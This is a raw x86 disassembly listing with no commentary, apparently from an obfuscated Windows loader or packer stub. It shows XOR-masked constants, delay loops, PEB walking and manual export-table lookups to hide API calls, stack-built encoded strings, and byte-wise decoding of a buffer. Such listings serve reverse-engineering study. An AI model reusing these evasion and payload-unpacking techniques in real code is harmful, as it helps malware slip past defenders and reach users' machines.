  412860:	mov    DWORD PTR [ebp-0x2c],0xf89cb5b5
  412867:	mov    DWORD PTR [ebp-0x3c],0xf89c85b1
  41286e:	push   0x24
  412870:	pop    ecx
  412871:	mov    DWORD PTR [ebp-0x28],ecx
  412874:	mov    DWORD PTR [ebp-0x28],ecx
  412877:	push   0x64
  412879:	pop    ecx
  41287a:	mov    DWORD PTR [ebp-0x28],ecx
  41287d:	mov    DWORD PTR [ebp-0x28],ecx
  412880:	mov    DWORD PTR [ebp-0x28],0x4c
  412887:	mov    DWORD PTR [ebp-0x28],0x42
  41288e:	mov    ecx,DWORD PTR [ebp-0x8]
  412891:	xor    ecx,ebx
  412893:	add    ecx,eax
  412895:	mov    DWORD PTR [ebp-0x28],ecx
  412898:	mov    ecx,DWORD PTR [ebp-0x8]
  41289b:	xor    ecx,ebx
  41289d:	add    ecx,eax
  41289f:	mov    DWORD PTR [ebp-0x28],ecx
  4128a2:	mov    DWORD PTR [ebp-0x24],0x256
  4128a9:	mov    DWORD PTR [ebp-0x1c],0x34
  4128b0:	mov    DWORD PTR [ebp-0xc],0x78
  4128b7:	lea    edi,[ebp-0xcc]
  4128bd:	lea    esi,[ebp-0xec]
  4128c3:	call   0x413346
  4128c8:	dec    DWORD PTR [ebp-0xc]
  4128cb:	jne    0x4128b7
  4128cd:	dec    DWORD PTR [ebp-0x1c]
  4128d0:	jne    0x4128b0
  4128d2:	dec    DWORD PTR [ebp-0x24]
  4128d5:	jne    0x4128a9
  4128d7:	mov    DWORD PTR [ebp-0x1c],0x400c
  4128de:	mov    eax,DWORD PTR [ebp-0x8]
  4128e1:	xor    eax,ebx
  4128e3:	mov    esi,0x3272dd
  4128e8:	add    eax,esi
  4128ea:	mov    DWORD PTR [ebp-0x14],eax
  4128ed:	mov    eax,DWORD PTR [ebp-0x8]
  4128f0:	and    DWORD PTR [ebp-0x8c],0x0
  4128f7:	xor    eax,ebx
  4128f9:	add    eax,esi
  4128fb:	mov    DWORD PTR [ebp-0x24],eax
  4128fe:	mov    eax,fs:0x18
  412904:	mov    DWORD PTR [ebp-0x8c],eax
  41290a:	mov    eax,DWORD PTR [eax+0x30]
  41290d:	mov    DWORD PTR [ebp-0x90],eax
  412913:	mov    eax,DWORD PTR [eax+0xc]
  412916:	mov    DWORD PTR [ebp-0x9c],eax
  41291c:	mov    eax,DWORD PTR [ebp+0x8]
  41291f:	lea    ecx,[ebp-0x8c]
  412925:	mov    DWORD PTR [eax+0x1a0],ecx
  41292b:	mov    eax,DWORD PTR [ebp+0x8]
  41292e:	lea    ecx,[ebp-0x90]
  412934:	mov    DWORD PTR [eax+0x1a4],ecx
  41293a:	mov    eax,DWORD PTR [ebp+0x8]
  41293d:	push   DWORD PTR [ebp+0x8]
  412940:	lea    ecx,[ebp-0x9c]
  412946:	mov    DWORD PTR [eax+0x1a8],ecx
  41294c:	call   0x414b04
  412951:	mov    ecx,DWORD PTR [ebp-0x8]
  412954:	xor    ecx,ebx
  412956:	add    ecx,esi
  412958:	cmp    ecx,eax
  41295a:	je     0x412c2e
  412960:	mov    eax,DWORD PTR [ebp+0x8]
  412963:	mov    eax,DWORD PTR [eax+0x194]
  412969:	mov    ecx,DWORD PTR [eax]
  41296b:	mov    eax,DWORD PTR [ebp+0x8]
  41296e:	mov    eax,DWORD PTR [eax+0x194]
  412974:	mov    eax,DWORD PTR [eax]
  412976:	add    eax,DWORD PTR [ecx+0x3c]
  412979:	mov    ecx,DWORD PTR [ebp+0x8]
  41297c:	mov    ecx,DWORD PTR [ecx+0x1d8]
  412982:	lea    edx,[ebp-0xac]
  412988:	push   edx
  412989:	mov    edx,DWORD PTR [ebp+0x8]
  41298c:	mov    edx,DWORD PTR [edx+0x18c]
  412992:	mov    edx,DWORD PTR [edx]
  412994:	add    edx,DWORD PTR [eax+0x88]
  41299a:	push   0x4
  41299c:	push   DWORD PTR [eax+0x8c]
  4129a2:	push   edx
  4129a3:	call   DWORD PTR [ecx+0x1c]
  4129a6:	push   DWORD PTR [ebp+0x8]
  4129a9:	mov    edi,DWORD PTR [ebp+0x8]
  4129ac:	mov    eax,DWORD PTR [ebp+0x8]
  4129af:	mov    edx,DWORD PTR [eax+0x1b8]
  4129b5:	mov    DWORD PTR [ebp-0x5c],0xc0e0f06
  4129bc:	mov    DWORD PTR [ebp-0x58],0x50a091f
  4129c3:	mov    WORD PTR [ebp-0x54],0x7a3d
  4129c9:	mov    DWORD PTR [ebp-0x70],0x23f0f25
  4129d0:	mov    DWORD PTR [ebp-0x6c],0x63d0c1d
  4129d7:	mov    DWORD PTR [ebp-0x68],0x281d020a
  4129de:	mov    DWORD PTR [ebp-0x64],0xc0109f1
  4129e5:	mov    DWORD PTR [ebp-0x60],0x7a3d1f05
  4129ec:	mov    DWORD PTR [ebp-0x84],0x23f0f25
  4129f6:	mov    DWORD PTR [ebp-0x80],0x63d0c1d
  4129fd:	mov    DWORD PTR [ebp-0x7c],0x281d020a
  412a04:	mov    DWORD PTR [ebp-0x78],0xc0109f1
  412a0b:	mov    DWORD PTR [ebp-0x74],0x7a131f05
  412a12:	call   0x414b33
  412a17:	push   eax
  412a18:	mov    eax,DWORD PTR [ebp+0x8]
  412a1b:	mov    eax,DWORD PTR [eax+0x1a8]
  412a21:	push   DWORD PTR [eax]
  412a23:	call   0x4147d5
  412a28:	test   eax,eax
  412a2a:	jne    0x412a7c
  412a2c:	mov    eax,DWORD PTR [ebp+0x8]
  412a2f:	mov    eax,DWORD PTR [eax+0x1d8]
  412a35:	mov    edi,DWORD PTR [ebp+0x8]
  412a38:	add    eax,0x4
  412a3b:	mov    DWORD PTR [ebp-0x18],eax
  412a3e:	mov    eax,DWORD PTR [ebp+0x8]
  412a41:	mov    edx,DWORD PTR [eax+0x1b8]
  412a47:	call   0x414b33
  412a4c:	push   eax
  412a4d:	mov    eax,DWORD PTR [ebp-0x18]
  412a50:	call   DWORD PTR [eax]
  412a52:	test   eax,eax
  412a54:	jne    0x412a7c
  412a56:	mov    eax,DWORD PTR [ebp+0x8]
  412a59:	mov    eax,DWORD PTR [eax+0x1d8]
  412a5f:	mov    edi,DWORD PTR [ebp+0x8]
  412a62:	add    eax,0x10
  412a65:	mov    DWORD PTR [ebp-0x18],eax
  412a68:	mov    eax,DWORD PTR [ebp+0x8]
  412a6b:	mov    edx,DWORD PTR [eax+0x1b8]
  412a71:	call   0x414b33
  412a76:	push   eax
  412a77:	mov    eax,DWORD PTR [ebp-0x18]
  412a7a:	call   DWORD PTR [eax]
  412a7c:	mov    eax,DWORD PTR [ebp-0x8]
  412a7f:	mov    ecx,DWORD PTR [ebp-0x1c]
  412a82:	xor    eax,ebx
  412a84:	add    eax,esi
  412a86:	cmp    eax,ecx
  412a88:	je     0x412c07
  412a8e:	mov    eax,DWORD PTR [ebp-0x34]
  412a91:	xor    eax,ebx
  412a93:	mov    ecx,0xffcd8d23
  412a98:	sub    ecx,eax
  412a9a:	add    ecx,DWORD PTR [ebp-0x1c]
  412a9d:	mov    eax,DWORD PTR [ebp-0x14]
  412aa0:	cmp    eax,ecx
  412aa2:	ja     0x412c07
  412aa8:	mov    DWORD PTR [ebp-0x4],0x0
  412aaf:	push   DWORD PTR [ebp+0x8]
  412ab2:	mov    edi,DWORD PTR [ebp+0x8]
  412ab5:	mov    eax,DWORD PTR [ebp+0x8]
  412ab8:	mov    edx,DWORD PTR [eax+0x1b4]
  412abe:	call   0x414b33
  412ac3:	push   eax
  412ac4:	mov    eax,DWORD PTR [ebp+0x8]
  412ac7:	mov    eax,DWORD PTR [eax+0x1a8]
  412acd:	push   DWORD PTR [eax]
  412acf:	call   0x4147d5
  412ad4:	mov    ecx,DWORD PTR [ebp+0x8]
  412ad7:	mov    ecx,DWORD PTR [ecx+0x19c]
  412add:	mov    DWORD PTR [ecx],eax
  412adf:	mov    eax,DWORD PTR [ebp+0x8]
  412ae2:	mov    edi,DWORD PTR [eax+0x1d8]
  412ae8:	mov    esi,DWORD PTR [ebp+0x8]
  412aeb:	xor    eax,eax
  412aed:	lea    edx,[ebp-0x84]
  412af3:	call   0x414b69
  412af8:	push   eax
  412af9:	mov    eax,DWORD PTR [ebp+0x8]
  412afc:	mov    eax,DWORD PTR [eax+0x19c]
  412b02:	push   DWORD PTR [eax]
  412b04:	call   DWORD PTR [edi+0x8]
  412b07:	mov    DWORD PTR [ebp-0x18],eax
  412b0a:	mov    eax,DWORD PTR [ebp+0x8]
  412b0d:	mov    edi,DWORD PTR [eax+0x1d8]
  412b13:	mov    esi,DWORD PTR [ebp+0x8]
  412b16:	xor    eax,eax
  412b18:	lea    edx,[ebp-0x70]
  412b1b:	call   0x414b69
  412b20:	push   eax
  412b21:	mov    eax,DWORD PTR [ebp+0x8]
  412b24:	mov    eax,DWORD PTR [eax+0x19c]
  412b2a:	push   DWORD PTR [eax]
  412b2c:	call   DWORD PTR [edi+0x8]
  412b2f:	and    DWORD PTR [ebp-0x10],0x0
  412b33:	mov    eax,DWORD PTR [ebp-0x10]
  412b36:	and    eax,0x7
  412b39:	add    eax,0x31
  412b3c:	push   eax
  412b3d:	call   DWORD PTR [ebp-0x18]
  412b40:	test   eax,eax
  412b42:	jne    0x412b49
  412b44:	and    DWORD PTR [ebp-0xc],eax
  412b47:	jmp    0x412b71
  412b49:	mov    eax,DWORD PTR [ebp+0x8]
  412b4c:	mov    edi,DWORD PTR [eax+0x1d8]
  412b52:	mov    esi,DWORD PTR [ebp+0x8]
  412b55:	xor    eax,eax
  412b57:	lea    edx,[ebp-0x5c]
  412b5a:	call   0x414b69
  412b5f:	push   eax
  412b60:	mov    eax,DWORD PTR [ebp+0x8]
  412b63:	mov    eax,DWORD PTR [eax+0x198]
  412b69:	push   DWORD PTR [eax]
  412b6b:	call   DWORD PTR [edi+0x8]
  412b6e:	mov    DWORD PTR [ebp-0xc],eax
  412b71:	inc    DWORD PTR [ebp-0x10]
  412b74:	cmp    DWORD PTR [ebp-0x10],0x10
  412b78:	jb     0x412b33
  412b7a:	mov    eax,DWORD PTR [ebp-0x34]
  412b7d:	mov    esi,DWORD PTR [ebp+0x8]
  412b80:	xor    eax,ebx
  412b82:	mov    edi,0x3272dd
  412b87:	add    eax,edi
  412b89:	lea    edx,[ebp-0xcc]
  412b8f:	call   0x414b69
  412b94:	push   eax
  412b95:	mov    eax,DWORD PTR [ebp-0x8]
  412b98:	mov    esi,DWORD PTR [ebp+0x8]
  412b9b:	xor    eax,ebx
  412b9d:	add    eax,edi
  412b9f:	lea    edx,[ebp-0xec]
  412ba5:	call   0x414b69
  412baa:	push   eax
  412bab:	call   DWORD PTR [ebp-0xc]
  412bae:	mov    ecx,DWORD PTR [ebp-0x8]
  412bb1:	xor    ecx,ebx
  412bb3:	add    ecx,edi
  412bb5:	cmp    ecx,eax
  412bb7:	jne    0x412bc0
  412bb9:	mov    DWORD PTR [ebp-0x4],0x1
  412bc0:	mov    eax,DWORD PTR [ebp-0x34]
  412bc3:	mov    ecx,DWORD PTR [ebp-0x14]
  412bc6:	xor    eax,ebx
  412bc8:	lea    eax,[eax+ecx*1+0x3272dd]
  412bcf:	mov    DWORD PTR [ebp-0x14],eax
  412bd2:	mov    eax,DWORD PTR [ebp-0x4]
  412bd5:	test   eax,eax
  412bd7:	je     0x412beb
  412bd9:	mov    eax,DWORD PTR [ebp-0x34]
  412bdc:	mov    ecx,DWORD PTR [ebp-0x24]
  412bdf:	xor    eax,ebx
  412be1:	lea    eax,[eax+ecx*1+0x3272dd]
  412be8:	mov    DWORD PTR [ebp-0x24],eax
  412beb:	mov    eax,DWORD PTR [ebp-0x34]
  412bee:	xor    eax,ebx
  412bf0:	mov    ecx,0xffcd8d23
  412bf5:	sub    ecx,eax
  412bf7:	add    ecx,DWORD PTR [ebp-0x1c]
  412bfa:	mov    eax,DWORD PTR [ebp-0x14]
  412bfd:	cmp    eax,ecx
  412bff:	jbe    0x412aa8
  412c05:	mov    esi,edi
  412c07:	mov    eax,DWORD PTR [ebp-0x24]
  412c0a:	mov    ecx,DWORD PTR [ebp-0x14]
  412c0d:	cmp    ecx,eax
  412c0f:	jne    0x412c22
  412c11:	push   DWORD PTR [ebp+0x8]
  412c14:	lea    eax,[ebp-0x30]
  412c17:	push   eax
  412c18:	call   0x4155e2
  412c1d:	mov    DWORD PTR [ebp-0x20],eax
  412c20:	jmp    0x412c2e
  412c22:	mov    eax,DWORD PTR [ebp-0x20]
  412c25:	mov    ecx,DWORD PTR [ebp-0x34]
  412c28:	xor    ecx,ebx
  412c2a:	add    ecx,esi
  412c2c:	xor    DWORD PTR [eax],ecx
  412c2e:	mov    eax,DWORD PTR [ebp-0x8]
  412c31:	mov    ecx,DWORD PTR [ebp-0x20]
  412c34:	xor    eax,ebx
  412c36:	add    eax,esi
  412c38:	cmp    eax,ecx
  412c3a:	je     0x413224
  412c40:	mov    eax,DWORD PTR [ebp-0x8]
  412c43:	mov    ecx,DWORD PTR [ebp-0x30]
  412c46:	xor    eax,ebx
  412c48:	add    eax,esi
  412c4a:	cmp    eax,ecx
  412c4c:	je     0x413224
  412c52:	mov    eax,DWORD PTR [ebp-0x8]
  412c55:	xor    eax,ebx
  412c57:	add    eax,esi
  412c59:	jmp    0x412c77
  412c5b:	mov    edi,DWORD PTR [ebp-0x20]
  412c5e:	mov    cl,al
  412c60:	and    cl,0x1f
  412c63:	or     dl,0xff
  412c66:	sub    dl,cl
  412c68:	add    BYTE PTR [edi+eax*1],dl
  412c6b:	mov    ecx,DWORD PTR [ebp-0x34]
  412c6e:	xor    ecx,ebx
  412c70:	lea    eax,[eax+ecx*1+0x3272dd]
  412c77:	mov    ecx,DWORD PTR [ebp-0x30]
  412c7a:	cmp    eax,ecx
  412c7c:	jb     0x412c5b
  412c7e:	mov    eax,DWORD PTR [ebp-0x30]
  412c81:	mov    DWORD PTR [ebp-0x1c],eax
  412c84:	mov    eax,DWORD PTR [ebp-0x20]
  412c87:	mov    DWORD PTR [ebp-0x24],0xf89c85b5
  412c8e:	mov    DWORD PTR [ebp-0xa8],eax
  412c94:	mov    ecx,0xf89c85b2
  412c99:	mov    DWORD PTR [ebp-0x14],ecx
  412c9c:	mov    eax,DWORD PTR [ebp-0x24]
  412c9f:	xor    eax,ebx
  412ca1:	add    eax,esi
  412ca3:	mov    DWORD PTR [ebp-0x4],eax
  412ca6:	mov    eax,DWORD PTR [ebp-0x24]
  412ca9:	xor    eax,ebx
  412cab:	add    eax,esi
  412cad:	mov    DWORD PTR [ebp-0x10],eax
  412cb0:	mov    DWORD PTR [ebp-0x40],0xf89c85d5
  412cb7:	mov    DWORD PTR [ebp-0x44],0xf89c85bc
  412cbe:	mov    eax,DWORD PTR [ebp-0x24]
  412cc1:	mov    edx,DWORD PTR [ebp-0x1c]
  412cc4:	xor    eax,ebx
  412cc6:	add    eax,esi
  412cc8:	cmp    edx,eax
  412cca:	je     0x412e02
  412cd0:	jmp    0x412dde
  412cd5:	mov    edx,DWORD PTR [ebp-0x4]
  412cd8:	mov    eax,DWORD PTR [ebp-0x1c]
  412cdb:	mov    edi,DWORD PTR [ebp-0x40]
  412cde:	sub    eax,edx
  412ce0:	xor    edi,ebx
  412ce2:	xor    edx,edx
  412ce4:	add    edi,esi
  412ce6:	div    edi
  412ce8:	mov    DWORD PTR [ebp-0x10],eax
  412ceb:	mov    eax,DWORD PTR [ebp-0x44]
  412cee:	mov    edx,DWORD PTR [ebp-0x10]
  412cf1:	xor    eax,ebx
  412cf3:	add    eax,esi
  412cf5:	cmp    edx,eax
  412cf7:	jbe    0x412d03
  412cf9:	mov    eax,DWORD PTR [ebp-0x44]
  412cfc:	xor    eax,ebx
  412cfe:	add    eax,esi
  412d00:	mov    DWORD PTR [ebp-0x10],eax
  412d03:	mov    eax,DWORD PTR [ebp-0x40]
  412d06:	mov    edx,DWORD PTR [ebp-0x10]
  412d09:	xor    eax,ebx
  412d0b:	add    eax,esi
  412d0d:	imul   eax,edx
  412d10:	mov    DWORD PTR [ebp-0x10],eax
  412d13:	mov    eax,DWORD PTR [ebp-0x24]
  412d16:	mov    edx,DWORD PTR [ebp-0x10]
  412d19:	xor    eax,ebx
  412d1b:	add    eax,esi
  412d1d:	cmp    edx,eax
  412d1f:	je     0x412dcc
  412d25:	mov    eax,DWORD PTR [ebp-0x10]
  412d28:	mov    DWORD PTR [ebp-0xc],eax
  412d2b:	mov    eax,DWORD PTR [ebp-0x4]
  412d2e:	add    eax,DWORD PTR [ebp-0xa8]
  412d34:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  412d3b:	mov    DWORD PTR [ebp-0x38],ecx
  412d3e:	mov    DWORD PTR [ebp-0x28],0xf89c85b3
  412d45:	mov    DWORD PTR [ebp-0x88],eax
  412d4b:	mov    DWORD PTR [ebp-0x28],0xf89c85b0
  412d52:	mov    DWORD PTR [ebp-0x94],ecx
  412d58:	mov    eax,DWORD PTR [ebp-0x18]
  412d5b:	xor    eax,ebx
  412d5d:	add    eax,esi
  412d5f:	jmp    0x412d8f
  412d61:	mov    eax,DWORD PTR [ebp-0x94]
  412d67:	mov    edx,DWORD PTR [ebp-0x10]
  412d6a:	xor    eax,ebx
  412d6c:	add    eax,esi
  412d6e:	imul   eax,edx
  412d71:	mov    edx,DWORD PTR [ebp-0x88]
  412d77:	mov    BYTE PTR [eax+edx*1],0x0
  412d7b:	mov    eax,DWORD PTR [ebp-0x28]
  412d7e:	mov    edx,DWORD PTR [ebp-0x38]
  412d81:	xor    eax,ebx
  412d83:	xor    edx,ebx
  412d85:	add    eax,esi
  412d87:	add    edx,esi
  412d89:	imul   eax,edx
  412d8c:	add    eax,DWORD PTR [ebp-0x10]
  412d8f:	mov    DWORD PTR [ebp-0x10],eax
  412d92:	mov    eax,DWORD PTR [ebp-0x10]
  412d95:	mov    edx,DWORD PTR [ebp-0xc]
  412d98:	cmp    edx,eax
  412d9a:	jb     0x412d61
  412d9c:	mov    eax,DWORD PTR [ebp-0x38]
  412d9f:	mov    edx,DWORD PTR [ebp-0xc]
  412da2:	xor    eax,ebx
  412da4:	add    eax,esi
  412da6:	imul   eax,edx
  412da9:	mov    edx,DWORD PTR [ebp-0x18]
  412dac:	xor    edx,ebx
  412dae:	add    edx,esi
  412db0:	or     eax,edx
  412db2:	mov    edx,DWORD PTR [ebp-0x14]
  412db5:	xor    edx,ebx
  412db7:	add    eax,edx
  412db9:	mov    edx,DWORD PTR [ebp-0x14]
  412dbc:	xor    edx,ebx
  412dbe:	add    eax,edx
  412dc0:	mov    edx,DWORD PTR [ebp-0x4]
  412dc3:	lea    eax,[eax+edx*1+0x64e5ba]
  412dca:	jmp    0x412ddb
  412dcc:	mov    eax,DWORD PTR [ebp-0x14]
  412dcf:	mov    edx,DWORD PTR [ebp-0x4]
  412dd2:	xor    eax,ebx
  412dd4:	lea    eax,[eax+edx*1+0x3272dd]
  412ddb:	mov    DWORD PTR [ebp-0x4],eax
  412dde:	mov    eax,DWORD PTR [ebp-0x14]
  412de1:	xor    eax,ebx
  412de3:	mov    edx,0xffcd8d23
  412de8:	sub    edx,eax
  412dea:	add    edx,DWORD PTR [ebp-0x1c]
  412ded:	mov    eax,DWORD PTR [ebp-0x14]
  412df0:	mov    edi,DWORD PTR [ebp-0x4]
  412df3:	xor    eax,ebx
  412df5:	add    eax,esi
  412df7:	imul   eax,edi
  412dfa:	cmp    eax,edx
  412dfc:	jbe    0x412cd5
  412e02:	mov    eax,DWORD PTR [ebp-0x8]
  412e05:	mov    ecx,DWORD PTR [ebp-0x30]
  412e08:	mov    eax,DWORD PTR [ebp+0x8]
  412e0b:	mov    edx,DWORD PTR [ebp-0x3c]
  412e0e:	mov    eax,DWORD PTR [eax+0x1d8]
  412e14:	xor    edx,ebx
  412e16:	add    edx,esi
  412e18:	push   edx
  412e19:	mov    edx,DWORD PTR [ebp-0x2c]
  412e1c:	xor    edx,ebx
  412e1e:	add    edx,esi
  412e20:	push   edx
  412e21:	push   ecx
  412e22:	mov    DWORD PTR [ebp-0x28],ecx
  412e25:	mov    ecx,DWORD PTR [ebp-0x8]
  412e28:	xor    ecx,ebx
  412e2a:	add    ecx,esi
  412e2c:	push   ecx
  412e2d:	call   DWORD PTR [eax+0x14]
  412e30:	mov    edi,eax
  412e32:	mov    eax,DWORD PTR [ebp-0x8]
  412e35:	xor    eax,ebx
  412e37:	add    eax,esi
  412e39:	cmp    eax,edi
  412e3b:	je     0x412e96
  412e3d:	mov    eax,DWORD PTR [ebp-0x8]
  412e40:	jmp    0x412e63
  412e42:	mov    ecx,DWORD PTR [ebp-0x20]
  412e45:	xor    eax,ebx
  412e47:	mov    cl,BYTE PTR [ecx+eax*1+0x3272dd]
  412e4e:	mov    BYTE PTR [eax+edi*1+0x3272dd],cl
  412e55:	mov    ecx,DWORD PTR [ebp-0x34]
  412e58:	xor    ecx,ebx
  412e5a:	lea    eax,[ecx+eax*1+0x3272dd]
  412e61:	xor    eax,ebx
  412e63:	mov    ecx,DWORD PTR [ebp-0x30]
  412e66:	sub    ecx,esi
  412e68:	xor    ecx,ebx
  412e6a:	cmp    eax,ecx
  412e6c:	jne    0x412e42
  412e6e:	mov    eax,DWORD PTR [ebp+0x8]
  412e71:	mov    ecx,DWORD PTR [ebp-0x48]
  412e74:	mov    eax,DWORD PTR [eax+0x1d8]
  412e7a:	xor    ecx,ebx
  412e7c:	add    ecx,esi
  412e7e:	push   ecx
  412e7f:	mov    ecx,DWORD PTR [ebp-0x8]
  412e82:	xor    ecx,ebx
  412e84:	add    ecx,esi
  412e86:	push   ecx
  412e87:	push   DWORD PTR [ebp-0x20]
  412e8a:	call   DWORD PTR [eax+0x18]
  412e8d:	mov    eax,DWORD PTR [ebp-0x28]
  412e90:	mov    DWORD PTR [ebp-0x20],edi
  412e93:	mov    DWORD PTR [ebp-0x30],eax
  412e96:	mov    edi,DWORD PTR [ebp-0x20]
  412e99:	mov    eax,DWORD PTR [ebp-0x34]
  412e9c:	mov    ecx,DWORD PTR [ebp-0x8]
  412e9f:	xor    eax,ebx
  412ea1:	mov    DWORD PTR [ebp-0x28],edi
  412ea4:	add    eax,esi
  412ea6:	mov    DWORD PTR [ebp-0x50],0x3d122a12
  412ead:	mov    DWORD PTR [ebp-0x4c],0x27123f12
  412eb4:	jmp    0x412ee8
  412eb6:	xor    ecx,ebx
  412eb8:	mov    dl,BYTE PTR [ebp+ecx*1+0x32728d]
  412ebf:	xor    dl,0x71
  412ec2:	sub    dl,0xb
  412ec5:	mov    DWORD PTR [ebp-0x2c],ecx
  412ec8:	movsx  ecx,BYTE PTR [ecx+edi*1+0x3272dd]
  412ed0:	movzx  edx,dl
  412ed3:	cmp    ecx,edx
  412ed5:	jne    0x412ef2
  412ed7:	mov    ecx,DWORD PTR [ebp-0x34]
  412eda:	mov    edx,DWORD PTR [ebp-0x2c]
  412edd:	xor    ecx,ebx
  412edf:	lea    ecx,[ecx+edx*1+0x3272dd]
  412ee6:	xor    ecx,ebx
  412ee8:	cmp    ecx,0xf89c85bd
  412eee:	jne    0x412eb6
  412ef0:	jmp    0x412ef9
  412ef2:	mov    eax,DWORD PTR [ebp-0x8]
  412ef5:	xor    eax,ebx
  412ef7:	add    eax,esi
  412ef9:	mov    ecx,DWORD PTR [ebp-0x8]
  412efc:	xor    ecx,ebx
  412efe:	add    ecx,esi
  412f00:	cmp    ecx,eax
  412f02:	je     0x413075
  412f08:	mov    eax,DWORD PTR [edi+0x8]
  412f0b:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  412f12:	mov    DWORD PTR [ebp-0x2c],0xf89cc304
  412f19:	mov    DWORD PTR [ebp-0x38],0xf89cb5b5
  412f20:	mov    DWORD PTR [ebp-0x18],0xf89c85b1
  412f27:	mov    DWORD PTR [ebp-0xc],eax
  412f2a:	mov    eax,DWORD PTR [ebp+0x8]
  412f2d:	mov    ecx,DWORD PTR [ebp-0x18]
  412f30:	xor    ecx,ebx
  412f32:	add    ecx,esi
  412f34:	push   ecx
  412f35:	mov    ecx,DWORD PTR [ebp-0x38]
  412f38:	mov    eax,DWORD PTR [eax+0x1d8]
  412f3e:	xor    ecx,ebx
  412f40:	add    ecx,esi
  412f42:	push   ecx
  412f43:	mov    ecx,DWORD PTR [ebp-0x2c]
  412f46:	xor    ecx,ebx
  412f48:	add    ecx,esi
  412f4a:	push   ecx
  412f4b:	mov    ecx,DWORD PTR [ebp-0x4]
  412f4e:	xor    ecx,ebx
  412f50:	add    ecx,esi
  412f52:	push   ecx
  412f53:	call   DWORD PTR [eax+0x14]
  412f56:	mov    edi,eax
  412f58:	mov    eax,DWORD PTR [ebp+0x8]
  412f5b:	mov    ecx,DWORD PTR [ebp-0x18]
  412f5e:	mov    eax,DWORD PTR [eax+0x1d8]
  412f64:	xor    ecx,ebx
  412f66:	add    ecx,esi
  412f68:	push   ecx
  412f69:	mov    ecx,DWORD PTR [ebp-0x38]
  412f6c:	xor    ecx,ebx
  412f6e:	add    ecx,esi
  412f70:	push   ecx
  412f71:	mov    ecx,DWORD PTR [ebp-0x4]
  412f74:	push   DWORD PTR [ebp-0xc]
  412f77:	xor    ecx,ebx
  412f79:	add    ecx,esi
  412f7b:	push   ecx
  412f7c:	call   DWORD PTR [eax+0x14]
  412f7f:	mov    ecx,DWORD PTR [ebp-0x4]
  412f82:	xor    ecx,ebx
  412f84:	add    ecx,esi
  412f86:	mov    DWORD PTR [ebp-0x18],eax
  412f89:	cmp    ecx,edi
  412f8b:	je     0x413251
  412f91:	mov    ecx,DWORD PTR [ebp-0x4]
  412f94:	xor    ecx,ebx
  412f96:	add    ecx,esi
  412f98:	cmp    ecx,eax
  412f9a:	je     0x413251
  412fa0:	mov    DWORD PTR [ebp-0x2c],0xf89c85b0
  412fa7:	mov    DWORD PTR [ebp-0x3c],0xf89c85b3
  412fae:	mov    ecx,DWORD PTR [ebp-0x2c]
  412fb1:	xor    cl,0x96
  412fb4:	sub    cl,0x23
  412fb7:	mov    BYTE PTR [edi],cl
  412fb9:	mov    ecx,DWORD PTR [ebp-0x4]
  412fbc:	xor    cl,0x96
  412fbf:	sub    cl,0x23
  412fc2:	mov    BYTE PTR [edi+0x1],cl
  412fc5:	mov    ecx,DWORD PTR [ebp-0x3c]
  412fc8:	xor    cl,0x96
  412fcb:	sub    cl,0x23
  412fce:	mov    BYTE PTR [edi+0x2],cl
  412fd1:	and    DWORD PTR [ebp-0x98],0x0
  412fd8:	and    DWORD PTR [ebp-0xa4],0x0
  412fdf:	lea    ecx,[ebp-0xa4]
  412fe5:	push   ecx
  412fe6:	push   DWORD PTR [ebp-0xc]
  412fe9:	push   eax
  412fea:	lea    eax,[ebp-0x98]
  412ff0:	push   eax
  412ff1:	mov    eax,DWORD PTR [ebp-0x28]
  412ff4:	push   DWORD PTR [eax+0xc]
  412ff7:	mov    eax,DWORD PTR [ebp-0x20]
  412ffa:	add    eax,0x10
  412ffd:	push   eax
  412ffe:	push   edi
  412fff:	call   0x41241b
  413004:	mov    DWORD PTR [ebp-0x2c],eax
  413007:	mov    eax,DWORD PTR [ebp+0x8]
  41300a:	mov    ecx,DWORD PTR [ebp-0x48]
  41300d:	mov    eax,DWORD PTR [eax+0x1d8]
  413013:	xor    ecx,ebx
  413015:	add    ecx,esi
  413017:	push   ecx
  413018:	mov    ecx,DWORD PTR [ebp-0x4]
  41301b:	xor    ecx,ebx
  41301d:	add    ecx,esi
  41301f:	push   ecx
  413020:	push   edi
  413021:	call   DWORD PTR [eax+0x18]
  413024:	mov    eax,DWORD PTR [ebp-0x2c]
  413027:	add    eax,0xffcd8d23
  41302c:	xor    eax,ebx
  41302e:	cmp    eax,0xf89c85b5
  413033:	mov    eax,DWORD PTR [ebp+0x8]
  413036:	mov    eax,DWORD PTR [eax+0x1d8]
  41303c:	mov    ecx,DWORD PTR [ebp-0x48]
  41303f:	jne    0x413062
  413041:	xor    ecx,ebx
  413043:	add    ecx,esi
  413045:	push   ecx
  413046:	mov    ecx,DWORD PTR [ebp-0x4]
  413049:	xor    ecx,ebx
  41304b:	add    ecx,esi
  41304d:	push   ecx
  41304e:	push   DWORD PTR [ebp-0x20]
  413051:	call   DWORD PTR [eax+0x18]
  413054:	mov    eax,DWORD PTR [ebp-0x18]
  413057:	mov    DWORD PTR [ebp-0x20],eax
  41305a:	mov    eax,DWORD PTR [ebp-0xc]
  41305d:	mov    DWORD PTR [ebp-0x30],eax
  413060:	jmp    0x413075
  413062:	xor    ecx,ebx
  413064:	add    ecx,esi
  413066:	push   ecx
  413067:	mov    ecx,DWORD PTR [ebp-0x4]
  41306a:	xor    ecx,ebx
  41306c:	add    ecx,esi
  41306e:	push   ecx
  41306f:	push   DWORD PTR [ebp-0x18]
  413072:	call   DWORD PTR [eax+0x18]
  413075:	mov    eax,DWORD PTR [ebp-0x30]
  413078:	mov    DWORD PTR [ebp-0x24],eax
  41307b:	mov    eax,DWORD PTR [ebp-0x20]
  41307e:	mov    DWORD PTR [ebp-0x1c],0xf89c85b5
  413085:	mov    DWORD PTR [ebp-0x2c],eax
  413088:	mov    ecx,0xf89c85b2
  41308d:	mov    DWORD PTR [ebp-0x14],ecx
  413090:	mov    eax,DWORD PTR [ebp-0x1c]
  413093:	xor    eax,ebx
  413095:	add    eax,esi
  413097:	mov    DWORD PTR [ebp-0x4],eax
  41309a:	mov    eax,DWORD PTR [ebp-0x1c]
  41309d:	xor    eax,ebx
  41309f:	add    eax,esi
  4130a1:	mov    DWORD PTR [ebp-0xc],eax
  4130a4:	mov    DWORD PTR [ebp-0x38],0xf89c85d5
  4130ab:	mov    DWORD PTR [ebp-0x18],0xf89c85bc
  4130b2:	mov    eax,DWORD PTR [ebp-0x1c]
  4130b5:	mov    edx,DWORD PTR [ebp-0x24]
  4130b8:	xor    eax,ebx
